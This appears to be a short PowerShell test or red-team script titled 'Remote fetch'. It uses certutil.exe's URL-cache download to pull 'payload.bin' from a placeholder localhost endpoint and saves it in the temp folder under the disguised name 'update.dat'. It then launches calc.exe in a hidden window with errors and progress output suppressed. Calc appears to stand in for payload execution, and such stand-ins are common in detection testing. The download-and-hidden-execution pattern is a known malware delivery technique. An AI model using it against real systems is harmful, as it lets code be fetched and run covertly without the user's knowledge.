
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$EndpointUrl = "http://127.0.0.1:80/payload.bin"
)
certutil.exe -urlcache -split -f $EndpointUrl "$env:TEMP\update.dat"
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
